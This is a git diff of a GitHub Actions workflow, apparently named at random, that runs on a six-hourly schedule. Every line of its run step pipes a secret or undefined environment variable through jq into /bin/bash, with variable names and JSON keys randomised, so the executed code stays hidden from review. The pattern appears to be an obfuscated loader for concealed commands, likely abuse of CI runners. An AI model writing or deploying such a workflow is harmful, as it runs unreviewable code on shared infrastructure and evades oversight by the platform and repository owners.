@@ -2,9 +2,8 @@ name: sichuscx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 3/6 * * *'
-
-jobs:  # 32197
+    - cron: '52 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +11,15 @@ jobs:  # 32197
       - uses: actions/checkout@v4
       - name: sichuscx
         env:
-          ak6: ${{ secrets.ak6 }}
+          le42: ${{ secrets.le42 }}
         run: |
-          echo $ak6 | jq -r .no78 | /bin/bash
-          echo $euijx58 | jq -r .leh116 | /bin/bash
-          echo $rn9807 | jq -r .dczpg6 | /bin/bash
-          echo $a1 | jq -r .zgnbl14550 | /bin/bash
-          echo $cvtc3659 | jq -r .vmzj04138 | /bin/bash
-          echo $zvnof9890 | jq -r .xkeq35770 | /bin/bash
-          echo $xkndl22693 | jq -r .k13367 | /bin/bash
-          echo $j1209 | jq -r .nt54838 | /bin/bash
+          echo $le42 | jq -r .pgca35160 | /bin/bash
+          echo $in102 | jq -r .jxfy3 | /bin/bash
+          echo $jwrdc50 | jq -r .mqe8631 | /bin/bash
+          echo $ohb392 | jq -r .irr6828 | /bin/bash
+          echo $riqn59416 | jq -r .e7748 | /bin/bash
+          echo $erqro14 | jq -r .rziw703 | /bin/bash
+          echo $okuku728 | jq -r .bn5 | /bin/bash
+          echo $t29462 | jq -r .x02752 | /bin/bash
+          echo $s178 | jq -r .qd18789 | /bin/bash
 
